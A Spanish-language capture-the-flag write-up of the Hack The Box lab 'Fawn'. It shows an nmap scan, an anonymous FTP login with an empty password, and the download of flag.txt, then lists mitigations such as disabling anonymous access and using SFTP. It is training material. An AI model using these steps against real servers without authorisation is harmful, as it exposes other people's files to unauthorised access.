🦌 Máquina: Fawn (Starting Point - Tier 0)

Esta es la segunda máquina de la serie Starting Point de Hack The Box. En este laboratorio, exploramos el protocolo FTP y cómo una configuración incorrecta permite el acceso no autorizado a archivos sensibles.
📊 Resumen de la Máquina

    IP del Objetivo: 10.129.57.237

    Dificultad: Muy Fácil

    Sistemas/Servicios: FTP (vsFTPd 3.0.3)

    Vulnerabilidad: Anonymous FTP Login (Acceso Anónimo)

🔍 Fase 1: Enumeración (Reconocimiento)

Primero, realizamos un escaneo de puertos con Nmap para identificar qué servicios están corriendo en la máquina:
Bash

nmap -sV 10.129.57.237

Resultados clave:

    Puerto 21/tcp: Abierto.

    Servicio: ftp.

    Versión: vsftpd 3.0.3.

    OS: Unix.

🛠️ Fase 2: Explotación (Acceso al Sistema)

Al detectar un servidor FTP, probamos si el inicio de sesión anónimo está habilitado. Este es un error de configuración común donde el usuario anonymous no requiere una contraseña válida.

    Conexión:
    Bash

    ftp 10.129.57.237

    Credenciales:

        Name: anonymous

        Password: (Presionar Enter, dejar vacío)

    Resultado: 230 Login successful.

🚩 Fase 3: Captura de la Flag

Una vez dentro del servidor, navegamos por el sistema de archivos para localizar el objetivo:

    Listar archivos:
    Fragmento de código

ftp> ls

(Aparece el archivo flag.txt en el directorio raíz).

Descargar el archivo:
Fragmento de código

ftp> get flag.txt

Lectura local:
Salimos del cliente FTP con exit y leemos la flag en nuestra terminal local:
Bash

    cat flag.txt

    Flag: .......

🛡️ Mitigación y Recomendaciones

Para proteger un servidor contra este tipo de ataques, se deben seguir estas "Buenas Prácticas":

    Desactivar Anonymous: Cambiar la configuración en /etc/vsftpd.conf a anonymous_enable=NO.

    Usar Protocolos Seguros: Reemplazar FTP (que envía todo en texto plano) por SFTP o FTPS para cifrar la comunicación.

    Firewall: Limitar el acceso al puerto 21 solo a direcciones IP confiables.

💡 Conceptos Aprendidos

    FTP (File Transfer Protocol): Puerto 21.

    Código 230: Indica que el login ha sido exitoso.

    Diferencia entre comandos: ls (listar) y get (descargar).
